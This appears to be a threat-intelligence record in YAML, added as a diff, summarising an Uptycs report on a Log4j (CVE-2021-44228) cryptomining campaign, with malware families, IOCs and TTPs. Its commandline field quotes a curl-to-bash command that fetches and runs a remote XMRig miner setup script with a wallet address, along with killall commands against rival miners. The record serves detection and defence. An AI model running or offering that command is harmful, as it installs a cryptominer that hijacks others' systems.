@@ -1,0 +1,52 @@
+description: The Uptycs Threat Research Team has uncovered a large-scale, ongoing
+  operation within the Log4j campaign focused on deploying XMRig cryptominers. The
+  campaign leverages CVE-2021-44228 to exploit vulnerable systems and establish command-and-control
+  infrastructure.
+attribution: Unknown (attributed to Lazarus, APT28, APT35, DEV-0401)
+malware_families:
+- XMRig
+- NineRAT
+- DLRAT
+- BottomLoader
+- Kinsing
+- NightSky
+- Lockbit
+- Coinminer
+- Mirai
+- Tsunami
+- Mushtik botnet
+- Gafgyt
+TTPs:
+  processes:
+  - curl
+  - bash
+  - systemd
+  - sudo
+  - customx86
+  commandline:
+  - curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh
+    | LC_ALL=en_US.UTF-8 bash -s 486xqw7ysXdKw7RkVzT5tdSiDtE6soxUdYaGaGE1GoaCdvBF7rVg5oMXL9pFx3rB1WUCZrJvd6AHMFWipeYt5eFNUx9pmGNi=
+  - killall -9 paraiso.x86
+  - killall -9 xmrig
+  powershell: ''
+  scripting_engine: ''
+  registry_keys: ''
+  image_load: ''
+  network_connections: ''
+  file_activity:
+  - /home/user/Desktop/customx86
+  persistence:
+  - Exploiting Log4j vulnerability to deploy XMRig miner.
+  pipes: ''
+  process_relations: ''
+IOCs:
+- 139.99.171.1
+- 146.59.16.84
+- http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh
+- CVE-2021-44228
+authors:
+- Shilpesh Trivedi
+- Nisarga C M
+reference: https://www.uptycs.com/blog/threat-research-report-team/log4j-campaign-xmrig-malware
+date_of_publication: May 13, 2024
+file_creation_date: June 17, 2025
